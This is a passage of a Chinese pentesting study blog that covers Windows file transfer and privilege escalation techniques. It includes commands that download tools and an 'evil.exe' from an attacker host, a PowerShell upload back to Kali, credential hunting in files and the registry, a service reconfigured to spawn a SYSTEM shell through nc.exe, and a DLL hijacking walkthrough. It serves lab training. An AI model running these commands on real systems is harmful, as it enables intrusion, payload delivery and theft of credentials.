class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\offsec&gt;echo open 10.11.0.4 21&gt;ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo USER offsec&gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo lab&gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo bin&gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo GET nc.exe &gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo bye &gt;&gt; ftp.txt</span><br></pre></td></tr></table></figure><p>利用以上指定源文件下载nc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\offsec&gt; ftp -v -n -s:ftp.txt</span><br></pre></td></tr></table></figure><h3 id="使用脚本下载文件"><a href="#使用脚本下载文件" class="headerlink" title="使用脚本下载文件"></a>使用脚本下载文件</h3><p>Windows XP、2003等系统可以使用VBScript脚本下载文件</p><p>Win 7、2008以上系统可使用Powershell传输文件;</p><p>VBScript脚本(wget.vbs)</p><p>运行脚本下载攻击程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; cscript wget.vbs http://10.11.0.4/evil.exe evil.exe</span><br></pre></td></tr></table></figure><p>Powershell脚本</p><p>Powershell默认策略、配置有限制，因此需要增加绕过限制的参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1</span><br><span class="line"></span><br><span class="line">-ExecutionPolicy Bypass #绕过默认执行策略</span><br><span class="line">-NoLogo、-NonInteractive #隐藏powershell logo、banner、交互提示信息</span><br><span class="line">-NoProfile #禁用默认配置文件</span><br></pre></td></tr></table></figure><p>win10上自带curl可以直接下载,powshell里有wget</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://xxx -o shell.exe</span><br></pre></td></tr></table></figure><p>Powershell命令下载文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt;powershell.exe (New-Object System.Net.WebClient).DownloadFile(&#x27;http://10.11.0.4/evil.exe&#x27;,&#x27;new-exploit.exe&#x27;)</span><br></pre></td></tr></table></figure><p>利用certutil</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f &quot;https://xxx&quot; pstools.zip</span><br></pre></td></tr></table></figure><p>利用rdesktop，远程桌面连接同时挂载共享文件夹（kali攻击机）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -u &lt;user&gt; IP地址 -p &lt;pass&gt; -g 1200x900 -x -x80 -r sound:local -r disk:LinuxPictures=/home/user/Pictures</span><br></pre></td></tr></table></figure><p>如果rdesktop不好使，就用xfreerdp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:yfh /p:vv /v:172.16.8.137 /w:1200 /h:900 /drive:home,/home/kali/Downloads</span><br></pre></td></tr></table></figure><h2 id="从目标主机上下载文件"><a href="#从目标主机上下载文件" class="headerlink" title="从目标主机上下载文件"></a>从目标主机上下载文件</h2><p>kali上开文件共享，impacket-smbserver </p><p>或kali上开一个接收上传文件的php页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uploaddir</span> = <span class="string">&#x27;/var/www/uploads/&#x27;</span>;</span><br><span class="line"><span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$uploadfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在Kali 上创建接收端脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/upload.php</span><br></pre></td></tr></table></figure><p>创建目录接收文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /varlwww/uploads</span><br><span class="line">sudo chown www-data:/var/www/uploads</span><br></pre></td></tr></table></figure><p>从 Windows主机上传文件到Kali </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; powershell (New-Object</span><br><span class="line">System.Net.WebClient).uploadFile(&#x27;http://kali/upload.php&#x27;, &#x27;nc.exe&#x27;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows Privilege Escalation</title>
      <link href="/2024/04/08/WindowsPrivilegeEscalation/"/>
      <url>/2024/04/08/WindowsPrivilegeEscalation/</url>
      
        <content type="html"><![CDATA[<p>常见提权思路</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.服务配置错误</span><br><span class="line">2.文件或服务权限漏洞</span><br><span class="line">3.内核漏洞</span><br><span class="line">4.高权限运行的服务漏洞</span><br><span class="line">5.敏感信息泄漏</span><br><span class="line">6.总是在执行二进制文件之前提升特权的系统设置</span><br><span class="line">7.脚本中包含硬编码的凭证，以及许多其他内容</span><br><span class="line">8.高权限账号运行的服务或者计划任务，替换其执行的可执行文件</span><br></pre></td></tr></table></figure><p>参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.fuzzysecurity.com/tutorials/16.html</span><br></pre></td></tr></table></figure><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主要收集系统信息、网络信息、自启动服务信息等</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看系统信息</span></span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line">systeminfo</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看主机名和当前用户名</span></span><br><span class="line">hostname</span><br><span class="line">echo %username%</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看本机所有用户</span></span><br><span class="line">net users</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看目标用户的权限，所在组等信息</span></span><br><span class="line">net user 用户名 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看网络信息和路由表。</span></span><br><span class="line">ipconfig /all</span><br><span class="line">route print</span><br><span class="line">arp -A</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">有效的网络连接和防火墙规则</span></span><br><span class="line">netstat -ano #查看本机的端口状态</span><br><span class="line">netsh firewall show state #查看防火墙状态</span><br><span class="line">netsh firewall show config #查看防火墙配置</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">计划任务、正在运行的进程、已启动的服务和已安装的驱动程序</span></span><br><span class="line">schtasks /query /fo LIST /v #显示所有计划任务的详细输出</span><br><span class="line">tasklist /SVC #将正在运行的进程对应到已启动的服务</span><br><span class="line">net start</span><br><span class="line">DRIVERQUERY #收集驱动信息，因为一些第三方驱动程序也包含漏洞，大部分驱动运行在ring0层，权限很高</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">搜索关键字文件</span></span><br><span class="line">dir /s *pass* == *cred* == *vnc* == *.config*</span><br><span class="line">findstr /si password *.xml *.ini *.txt\</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用于 grep 注册表中的关键字，在本例中为“password”。</span></span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure><p>查看计划任务，重点看这里启动了哪个exe，是哪个用户启动的，这个exe我们攻击者有没有权限去修改，下次启动的时间是什么，这里就是c:\program files\windows defender\MpCmdRun.exe，是system启动的，如果能改成shell，就能拿到高权限的shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt; schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line">Folder: \Microsoft\Windows Defender</span><br><span class="line">HostName:                             B33F</span><br><span class="line">TaskName:                             \Microsoft\Windows Defender\MP Scheduled Scan</span><br><span class="line">Next Run Time:                        1/22/2014 5:11:13 AM</span><br><span class="line">[..Snip..]</span><br><span class="line">Task To Run:                          c:\program files\windows defender\MpCmdRun.exe Scan -ScheduleJob</span><br><span class="line">                                      -WinTask -RestrictPrivilegesScan</span><br><span class="line">[..Snip..]</span><br><span class="line">Run As User:                          SYSTEM</span><br><span class="line">[..Snip..]</span><br></pre></td></tr></table></figure><p>使用wmic进行信息收集（win10自带），Windows 的某些默认配置不允许访问 WMIC，除非用户是在管理员组中。任何版本的 XP 都不允许从低特权帐户访问 WMIC。相反，Windows 7 Professional 和 Windows 8 Enterprise 的默认安装允许低权限用户使用 WMIC 并查询操作系统，而无需修改任何设置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看补丁级别</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><p>最好的策略是寻找权限提升漏洞并查找其各自的 KB 补丁号。 此类漏洞包括但不限于 KiTrap0D (KB979682)、MS11-011 (KB2393802)、MS10-059 (KB982799)、MS10-021 (KB979683)、MS11-080 (KB2592799)。 枚举操作系统版本和服务包后，应该找出可能存在哪些权限提升漏洞。使用 KB 补丁编号，可以 grep 已安装的补丁以查看是否缺少任何补丁。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot;</span><br></pre></td></tr></table></figure><h2 id="敏感文件泄露凭据"><a href="#敏感文件泄露凭据" class="headerlink" title="敏感文件泄露凭据"></a>敏感文件泄露凭据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c:\sysprep.inf</span><br><span class="line">c:\sysprep\sysprep.xml</span><br><span class="line">%WINDIR%\Panther\Unattend\Unattended.xml</span><br><span class="line">%WINDIR%\Panther\Unattended.xml</span><br></pre></td></tr></table></figure><p>这些文件里可能有系统管理员配置的操作系统的账号和密码，Unattended.xml是Windows里的无人值守下的应答文件，企业环境下一个系统管理员要一次性部署很多机器，就希望实现自动化安装，就会把管理员账号的密码配置到Unattended.xml里</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sysprep.inf示例，存储的是明文密码</span></span><br><span class="line"></span><br><span class="line">[GuiUnattended]</span><br><span class="line">OEMSkipRegional=1</span><br><span class="line">OemSkipWelcome=1</span><br><span class="line">AdminPassword=s3cr3tp4ssw0rd</span><br><span class="line">TimeZone=20</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sysprep.xml示例，存储的是<span class="built_in">base64</span>编码的凭据</span></span><br><span class="line"></span><br><span class="line">&lt;LocalAccounts&gt;</span><br><span class="line">    &lt;LocalAccount wcm:action=&quot;add&quot;&gt;</span><br><span class="line">        &lt;Password&gt;</span><br><span class="line">            &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;</span><br><span class="line">            &lt;PlainText&gt;false&lt;/PlainText&gt;</span><br><span class="line">        &lt;/Password&gt;</span><br><span class="line">        &lt;Description&gt;Local Administrator&lt;/Description&gt;</span><br><span class="line">        &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;</span><br><span class="line">        &lt;Group&gt;Administrators&lt;/Group&gt;</span><br><span class="line">        &lt;Name&gt;Administrator&lt;/Name&gt;</span><br><span class="line">    &lt;/LocalAccount&gt;</span><br><span class="line">&lt;/LocalAccounts&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Unattended.xml示例</span></span><br><span class="line"></span><br><span class="line">&lt;AutoLogon&gt;</span><br><span class="line">    &lt;Password&gt;</span><br><span class="line">        &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;</span><br><span class="line">        &lt;PlainText&gt;false&lt;/PlainText&gt;</span><br><span class="line">    &lt;/Password&gt;</span><br><span class="line">    &lt;Enabled&gt;true&lt;/Enabled&gt;</span><br><span class="line">    &lt;Username&gt;Administrator&lt;/Username&gt;</span><br><span class="line">&lt;/AutoLogon&gt;</span><br></pre></td></tr></table></figure><h2 id="域环境下的信息收集"><a href="#域环境下的信息收集" class="headerlink" title="域环境下的信息收集"></a>域环境下的信息收集</h2><p>域环境下很多管理员会修改组策略，通过组策略修改域内所有客户端主机的管理员密码，这么做的目的是为了收回客户端用户对机器的管理员权限，让域内用户都以普通用户的身份去登录主机。所以域管理员都会通过域控下发组策略去修改所有域内客户端计算机的管理员密码，组策略下发下去是以加密的形式把密码加密了，但是密钥已经公开。</p><p>组策略实际上是xml文件。</p><h2 id="通过注册表漏洞AlwaysInstallElevated进行提权"><a href="#通过注册表漏洞AlwaysInstallElevated进行提权" class="headerlink" title="通过注册表漏洞AlwaysInstallElevated进行提权"></a>通过注册表漏洞AlwaysInstallElevated进行提权</h2><p>注册表设置“AlwaysInstallElevated”，如果启用此设置，则它允许任何权限级别的用户将 *.msi 文件安装为 NT AUTHORITY\SYSTEM。 在安装msi文件的时候会赋予当前用户以系统身份安装程序的能力。</p><p>需要检查是否设置了两个注册表项，如果是，则可以弹出一个 SYSTEM shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">仅当两个注册表项均包含 DWORD 值为 1 的“AlwaysInstallElevated”时，此操作才有效。</span></span><br><span class="line"></span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br></pre></td></tr></table></figure><h2 id="利用主机服务进行提权"><a href="#利用主机服务进行提权" class="headerlink" title="利用主机服务进行提权"></a>利用主机服务进行提权</h2><p>通过了解 Windows 服务，使用弱权限来提权。</p><p>可以使用accesschk.exe来检查权限，是 Microsoft Sysinternals Suite 中的一个工具。</p><p>下载地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 使用sc来查询、配置和管理Windows服务</span><br><span class="line">sc qc Spooler</span><br><span class="line"></span><br><span class="line"># 使用 accesschk 检查每个服务所需的权限级别。</span><br><span class="line">accesschk.exe -ucqv * #列出所有服务</span><br><span class="line">accesschk.exe -ucqv Spooler</span><br></pre></td></tr></table></figure><p>Accesschk可以自动检查我们是否对某个用户级别的Windows服务具有写权限，一定记得检查用户属于哪些用户组，例如“Power Users”被视为低权限用户组。</p><p>下面是win 8和xin XP的区别</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is on Windows 8.</span></span><br><span class="line"></span><br><span class="line">C:\Users\b33f\tools\Sysinternals&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *</span><br><span class="line">No matching objects found.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">On a default Windows XP SP0 we can see there is a pretty big security fail.</span></span><br><span class="line"></span><br><span class="line">C:\&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *</span><br><span class="line">RW SSDPSRV</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">RW upnphost</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line"></span><br><span class="line">C:\&gt; accesschk.exe -ucqv SSDPSRV</span><br><span class="line"></span><br><span class="line">SSDPSRV</span><br><span class="line"></span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Power Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line"></span><br><span class="line">C:\&gt; accesschk.exe -ucqv upnphost</span><br><span class="line"></span><br><span class="line">upnphost</span><br><span class="line"></span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Power Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br></pre></td></tr></table></figure><p>随着 XP SP2 的引入得到解决，但在 SP0 和 SP1 上它可以被用作通用本地权限提升漏洞。 通过重新配置服务，我们可以让它以系统级别权限运行我们选择的任何二进制文件。</p><p>以下是针对win XP SP0和SP1的提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc qc upnphost</span><br><span class="line"></span><br><span class="line">[SC] GetServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: upnphost</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</span><br><span class="line">        START_TYPE         : 3   DEMAND_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host</span><br><span class="line">        DEPENDENCIES       : SSDPSRV</span><br><span class="line">        SERVICE_START_NAME : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">C:\&gt; sc config upnphost binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&quot;</span><br><span class="line">[SC] ChangeServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">C:\&gt; sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</span><br><span class="line">[SC] ChangeServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">C:\&gt; sc qc upnphost</span><br><span class="line"></span><br><span class="line">[SC] GetServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: upnphost</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</span><br><span class="line">        START_TYPE         : 3   DEMAND_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host</span><br><span class="line">        DEPENDENCIES       : SSDPSRV</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br><span class="line"></span><br><span class="line">C:\&gt; net start upnphost</span><br></pre></td></tr></table></figure><h2 id="通过不正确的文件权限进行提权"><a href="#通过不正确的文件权限进行提权" class="headerlink" title="通过不正确的文件权限进行提权"></a>通过不正确的文件权限进行提权</h2><p>总体思路就是通过利用弱文件（夹）权限来提升权限。 比如DLL劫持提权，通过检索程序加载的dll文件， 如果程序或服务从攻击者具有写访问权限的目录加载文件，我们可以滥用该文件来弹出具有程序运行权限（这里是程序运行权限，也就是哪个用户运行的程序，就弹回哪个用户权限）的 shell。</p><p>通常，Windows 应用程序将使用预定义的搜索路径来查找 DLL，并按特定顺序检查这些路径。 DLL 劫持通常是通过将恶意 DLL 放置在这些路径之一中，同时确保在合法 DLL 之前找到恶意DLL提前加载。</p><p>32位系统的加载顺序如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 - The directory from which the application loaded</span><br><span class="line">2 - 32-bit System directory (C:\Windows\System32)</span><br><span class="line">3 - 16-bit System directory (C:\Windows\System)</span><br><span class="line">4 - Windows directory (C:\Windows)</span><br><span class="line">5 - The current working directory (CWD)</span><br><span class="line">6 - Directories in the PATH environment variable (system then user)</span><br></pre></td></tr></table></figure><h3 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h3><p>下面将使用尝试加载 wlbsctrl.dll 的 IKEEXT（IKE 和 AuthIP IPsec 密钥模块）服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is on Windows 7 as low privilege user1.</span></span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; echo %username%</span><br><span class="line"></span><br><span class="line">user1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">We have a win here since any non-default directory <span class="keyword">in</span> <span class="string">&quot;C:\&quot; will give write access to authenticated users.</span></span></span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; echo %path%</span><br><span class="line"></span><br><span class="line">C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program Files\OpenVPN\bin;C:\Python27</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">We can check our access permissions with accesschk or cacls.</span></span></span><br><span class="line"></span><br><span class="line">C:\Users\user1\Desktop&gt; accesschk.exe -dqv &quot;C:\Python27&quot;</span><br><span class="line"></span><br><span class="line">C:\Python27</span><br><span class="line">  Medium Mandatory Level (Default) [No-Write-Up]</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        FILE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        